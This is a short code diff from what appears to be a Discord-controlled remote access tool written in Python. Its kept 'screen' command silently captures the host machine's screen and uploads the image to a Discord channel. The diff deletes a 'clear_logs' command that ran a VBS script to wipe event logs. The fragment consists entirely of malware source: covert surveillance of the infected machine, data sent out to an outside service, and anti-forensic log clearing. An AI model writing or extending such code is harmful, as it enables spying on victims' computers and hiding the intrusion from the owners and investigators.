@@ -91,10 +91,4 @@ async def screen(ctx):
 	screenshot_1 = pyautogui.screenshot()
 	screenshot_1.save("screenshot.png")
 	await ctx.send(file=discord.File('screenshot.png'))
-@bot.command()
-async def clear_logs(ctx):
-	await ctx.send("[*] Command sent")
-	await ctx.send("Clearing event logs..")
-	os.system("clear_events.vbs")
-	await ctx.send("[#]....Done!")
 bot.run("token")
